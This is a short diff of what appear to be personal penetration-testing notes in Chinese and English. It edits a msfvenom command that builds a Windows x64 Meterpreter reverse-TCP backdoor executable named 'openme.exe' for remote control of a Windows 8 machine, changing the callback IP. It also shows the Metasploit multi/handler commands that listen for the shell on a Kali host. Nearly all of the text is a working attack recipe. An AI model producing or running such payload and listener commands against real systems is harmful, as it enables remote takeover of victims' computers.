@@ -43,7 +43,7 @@ cn_windows_7_professional_x86_dvd_x15-65790.iso   2009-08-23
 
 
 
-遥控 win8    msfvenom  -p windows/x64/meterpreter/reverse_tcp  LHOST=192.168.10.201  LPORT=50000  -f exe  -o openme.exe
+遥控 win8    msfvenom  -p windows/x64/meterpreter/reverse_tcp  LHOST=192.168.55.201  LPORT=50000  -f exe  -o openme.exe
 use exploit/multi/handler 
 set payload windows/x64/meterpreter/reverse_tcp
 set lhost 192.168.55.201                 kali  ip 地址
